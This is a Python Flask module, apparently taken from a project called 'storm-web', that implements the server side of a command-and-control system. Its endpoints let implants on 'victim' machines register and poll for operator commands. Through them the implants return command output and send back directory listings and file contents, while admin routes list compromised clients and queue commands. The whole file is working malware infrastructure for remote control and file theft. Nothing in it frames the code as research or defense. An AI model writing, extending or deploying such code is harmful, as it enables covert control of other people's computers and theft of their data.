"""P3.2 part C - /api/c2/* (C2 implant + admin file manager).

Routes verbatim from storm-web/app.py:601-779 (lines moved at
extraction time).  See app/blueprints/capture.py for the package
documentation.  C2 state lives in app.state (dict identity preserved
so admin GETs see what victim POSTs write).
"""
from __future__ import annotations

import os
from datetime import datetime

from flask import Blueprint, jsonify, request

import database as db

from app.state import (
    C2_COMMANDS,
    C2_DOWNLOADS,
    C2_FILE_LISTS,
    C2_RESPONSES,
    C2_SESSIONS,
    BASE_DIR,
)


bp = Blueprint("capture_c2", __name__,
               template_folder=os.path.join(BASE_DIR, "flask_templates"))


# ---------------------------------------------------------------------------
# Victim-side: implant polls / queues commands / returns responses.
# ---------------------------------------------------------------------------
@bp.route('/api/c2/register', methods=['POST'])
def c2_register():
    data = request.json
    uid = data.get('uid')
    info = data.get('info', {})

    if not uid:
        return jsonify({'error': 'No uid provided'}), 400

    C2_SESSIONS[uid] = {
        'last_seen': datetime.now().isoformat(),
        'info': info,
        'ip': request.remote_addr
    }

    # Persist so the client list survives a server restart
    db.save_c2_session(uid, info, request.remote_addr)

    # Initialise queues if new
    if uid not in C2_COMMANDS:
        C2_COMMANDS[uid] = []
    if uid not in C2_RESPONSES:
        C2_RESPONSES[uid] = []

    return jsonify({'status': 'registered'})


@bp.route('/api/c2/poll', methods=['POST'])
def c2_poll():
    data = request.json
    uid = data.get('uid')

    if not uid:
        return jsonify({'error': 'No uid provided'}), 400

    if uid in C2_SESSIONS:
        C2_SESSIONS[uid]['last_seen'] = datetime.now().isoformat()

    db.update_c2_last_seen(uid)

    if uid in C2_COMMANDS and len(C2_COMMANDS[uid]) > 0:
        cmd = C2_COMMANDS[uid].pop(0)
        return jsonify({'command': cmd})

    return jsonify({'command': None})


@bp.route('/api/c2/response', methods=['POST'])
def c2_response():
    data = request.json
    uid = data.get('uid')
    output = data.get('output')

    if not uid:
        return jsonify({'error': 'No uid provided'}), 400

    if uid in C2_SESSIONS:
        C2_SESSIONS[uid]['last_seen'] = datetime.now().isoformat()

    if uid not in C2_RESPONSES:
        C2_RESPONSES[uid] = []

    C2_RESPONSES[uid].append({
        'timestamp': datetime.now().isoformat(),
        'output': output
    })

    return jsonify({'status': 'received'})


# ---------------------------------------------------------------------------
# Admin APIs: list clients, queue commands, stream responses.
# ---------------------------------------------------------------------------
@bp.route('/api/c2/clients')
def c2_list_clients():
    active = []
    now = datetime.now()

    for uid, db_session in db.get_all_c2_sessions().items():
        if uid not in C2_SESSIONS:
            C2_SESSIONS[uid] = db_session

    for uid, sess in C2_SESSIONS.items():
        if not uid:
            continue
        try:
            last = datetime.fromisoformat(sess['last_seen'])
            delta = (now - last).total_seconds()
            status = 'online' if delta < 20 else 'offline'
        except Exception:
            status = 'offline'

        active.append({
            'uid': uid,
            'ip': sess['ip'],
            'info': sess['info'],
            'status': status,
            'last_seen': sess['last_seen']
        })
    return jsonify({'clients': active})


@bp.route('/api/c2/queue_command', methods=['POST'])
def c2_queue_command():
    data = request.json
    uid = data.get('uid')
    cmd = data.get('cmd')

    if uid not in C2_COMMANDS:
        C2_COMMANDS[uid] = []

    C2_COMMANDS[uid].append(cmd)
    return jsonify({'status': 'queued'})


@bp.route('/api/c2/get_responses/<uid>')
def c2_get_responses(uid):
    if uid in C2_RESPONSES:
        resps = C2_RESPONSES[uid]
        C2_RESPONSES[uid] = []  # stream semantics
        return jsonify({'responses': resps})
    return jsonify({'responses': []})


# ---------------------------------------------------------------------------
# File-manager endpoints (between victim implant and operator panel).
# C2_FILE_LISTS / C2_DOWNLOADS now live in app.state.
# ---------------------------------------------------------------------------
@bp.route('/api/c2/get_file_list/<uid>')
def c2_get_file_list(uid):
    if uid in C2_FILE_LISTS:
        file_data = C2_FILE_LISTS[uid]
        del C2_FILE_LISTS[uid]
        return jsonify(file_data)
    return jsonify({'files': None})


@bp.route('/api/c2/get_download/<uid>')
def c2_get_download(uid):
    if uid in C2_DOWNLOADS:
        file_data = C2_DOWNLOADS[uid]
        del C2_DOWNLOADS[uid]
        return jsonify(file_data)
    return jsonify({'file': None})


@bp.route('/api/c2/file_list_response', methods=['POST'])
def c2_file_list_response():
    """Victim sends file list back."""
    data = request.json
    uid = data.get('uid')
    files = data.get('files')
    path = data.get('path')

    if uid:
        C2_FILE_LISTS[uid] = {
            'files': files,
            'path': path
        }

    return jsonify({'status': 'received'})


@bp.route('/api/c2/file_download_response', methods=['POST'])
def c2_file_download_response():
    """Victim sends file content back."""
    data = request.json
    uid = data.get('uid')
    content = data.get('content')
    filename = data.get('filename')

    if uid:
        C2_DOWNLOADS[uid] = {
            'file': {
                'content': content,
                'filename': filename
            }
        }

    return jsonify({'status': 'received'})
